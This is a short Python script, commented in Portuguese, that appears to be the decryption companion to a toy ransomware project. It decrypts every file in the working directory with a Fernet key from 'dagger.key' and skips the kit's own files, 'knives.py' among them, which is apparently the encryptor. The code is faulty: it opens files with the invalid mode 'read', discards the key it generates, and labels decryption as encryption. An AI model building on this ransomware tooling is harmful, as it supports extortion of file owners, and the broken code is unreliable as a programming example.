import os
from cryptography.fernet import Fernet

files = []

# Chave de recuperação ramsomware
key = Fernet.generate_key()

with open('dagger.key', 'rb') as key:
    antidote = key.read()

for file in os.listdir():
    if file == 'knives.py' or file == 'dagger.key' or file == 'shields.py':  # não vai colocar na lista de files
        continue
    if os.path.isfile(file):
        files.append(file)

# Fazendo a cryptográfia
for file in files:
    with open(file, 'read') as archives:
        content = archives.read()
    content_decrypted = Fernet(antidote).decrypt(content)
    with open(file, 'wb') as archive:
        archive.write(content_decrypted)
